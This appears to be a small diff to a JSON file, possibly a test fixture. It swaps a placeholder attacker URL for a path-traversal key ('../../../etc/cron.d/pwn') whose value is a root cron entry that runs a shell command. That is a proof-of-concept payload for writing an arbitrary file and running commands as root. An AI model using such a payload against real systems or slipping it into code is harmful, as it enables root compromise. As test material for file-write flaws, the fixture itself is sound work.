@@ -1,4 +1,5 @@
 {
-  "test": "value",
-  "url": "http://attacker.example.com"
+  "../../../etc/cron.d/pwn": {
+    "cmd": "* * * * * root /bin/bash -c 'id > /tmp/pwned'"
+  }
 }
